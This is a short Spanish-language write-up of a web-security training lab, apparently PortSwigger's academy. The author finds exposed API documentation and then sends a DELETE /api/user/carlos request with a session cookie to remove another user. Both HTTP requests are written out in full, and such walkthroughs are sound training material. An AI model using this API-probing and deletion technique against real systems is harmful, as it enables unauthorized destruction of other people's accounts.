---
layout: post
author: kryraj
---

En este laboratorio nuestro objetivo eliminar a Carlos. 
Tenemos las siguientes credenciales. 

```
wiener:peter
```

Cuando inciemos session, podemos pasarla a burpsuite, y ya vemos que toca la api. Modificaré la solicutd de poder obtener algún error, o información interesante.

```
GET /api/ HTTP/2
Host: 0a1c00740450366180ec17040023006b.web-security-academy.net
Cookie: session=<coockie>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1c00740450366180ec17040023006b.web-security-academy.net/api
Origin: https://0a1c00740450366180ec17040023006b.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
```

Vemos esto 

![Image]({{ site.baseurl }}/assets/images/api_hacking1.png)

Ahora que tenemos la documentación podemos hacer la siguiente petición.

```
DELETE /api/user/carlos HTTP/2
Host: 0a1c00740450366180ec17040023006b.web-security-academy.net
Cookie: session=yYKaXgNq8FoBOpT7VSx3OLtGVM4rTWHo
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1c00740450366180ec17040023006b.web-security-academy.net/api
Origin: https://0a1c00740450366180ec17040023006b.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

```

¡Laboratorio completado! 
